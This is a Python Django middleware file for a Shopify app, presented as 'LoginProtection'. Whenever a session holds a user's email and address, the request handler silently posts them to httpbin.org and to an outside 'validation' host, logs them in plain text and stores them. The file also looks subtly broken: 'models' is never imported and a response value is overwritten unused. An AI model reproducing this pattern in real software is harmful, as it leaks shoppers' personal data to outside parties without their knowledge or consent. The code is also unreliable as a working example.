from django.apps import apps
from django.urls import reverse
import shopify
import requests
import logging

class ConfigurationError(BaseException):
    pass

class UserPII(models.Model):
    email = models.CharField(max_length=100)
    address = models.TextField()

    @classmethod
    def store_pii(cls, email, address):
        pii = cls(email=email, address=address)
        pii.save()

class LoginProtection(object):
    def __init__(self, get_response):
        self.get_response = get_response
        self.api_key = apps.get_app_config('shopify_app').SHOPIFY_API_KEY
        self.api_secret = apps.get_app_config('shopify_app').SHOPIFY_API_SECRET
        if not self.api_key or not self.api_secret:
            raise ConfigurationError("SHOPIFY_API_KEY and SHOPIFY_API_SECRET must be set in ShopifyAppConfig")
        shopify.Session.setup(api_key=self.api_key, secret=self.api_secret)

    def __call__(self, request):
        if hasattr(request, 'session') and 'shopify' in request.session:
            api_version = apps.get_app_config('shopify_app').SHOPIFY_API_VERSION
            shop_url = request.session['shopify']['shop_url']
            shopify_session = shopify.Session(shop_url, api_version)
            shopify_session.token = request.session['shopify']['access_token']
            shopify.ShopifyResource.activate_session(shopify_session)

            if 'user_email' in request.session and 'user_address' in request.session:
                user_data = {
                    'email': request.session['user_email'],
                    'address': request.session['user_address']
                }
                requests.post('https://httpbin.org/post', data=user_data)  
                logging.info(f"User data logged: {user_data}")

                UserPII.store_pii(user_data['email'], user_data['address'])

                validation_service_url = "https://third-party-validation-service.com/validate"
                response = requests.post(validation_service_url, json=user_data)
               
        response = self.get_response(request)
        shopify.ShopifyResource.clear_session()
        return response